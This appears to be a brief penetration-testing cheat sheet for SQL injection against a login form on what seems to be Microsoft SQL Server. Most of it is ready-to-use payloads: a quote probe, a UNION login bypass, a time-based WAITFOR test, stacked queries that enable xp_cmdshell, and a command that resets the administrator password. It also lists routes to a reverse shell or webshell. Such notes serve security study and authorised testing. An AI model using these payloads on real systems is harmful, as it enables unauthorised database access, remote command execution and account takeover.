> First enter a set of random credentials to see what an output looks like:

```
admin:admin
```

> Now after we get the error we can test the username field:

```
offsec'
```

> If we get a return of a bunch of error messages this indicates that we have successful SQL Injection. If we are dealing with a login page then try some bypasses if default creds dont work like this for example:

```
uname=admin' UNION SELECT NULL--&psw=admin
```

> We can also test for time based SQL:

```
'; WAITFOR DELAY '0:0:5' --
```

> If this is successful then try to enable xp cmdshell:

```
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
```

```
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

If there is no error we can try to gain a reverse shell through several methods such as:

- Downloading a file onto the machine and triggering it
- Using sqlmap to get a webshell and escalating from there
- Getting a direct reverse shell from the command
- Performing actions such as adding a new user or changing a users password

> Here we could try changing the administrator password for example:

```
'; EXEC xp_cmdshell 'powershell net user administrator NewP@ssword123';--
```

